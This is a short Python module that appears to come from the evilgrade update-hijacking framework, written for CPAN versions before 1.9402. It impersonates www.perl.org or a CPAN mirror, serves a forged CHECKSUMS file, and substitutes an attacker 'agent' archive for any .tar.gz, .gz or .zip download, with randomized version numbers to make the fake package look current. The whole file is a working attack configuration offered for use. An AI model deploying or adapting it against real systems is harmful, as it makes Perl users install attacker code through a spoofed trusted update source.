from modules import ModuleBase


class Cpan(ModuleBase):
    name = 'cpan'
    version = '1.0'
    appver = '< 1.9402 (tested 19205 Slackware 13)'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/agent_perl.tar.gz'
    vh = '(www.perl.org|cpan.localhost.net.ar)' 
    requests = [
        {   'path': '/CHECKSUMS',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/cpan/CHECKSUMS',
        },
        {   'path': '(.tar.gz|.gz|.zip)',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'module': {
            'val': "module.options['brequest']['val'].split('/')[-1] ",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }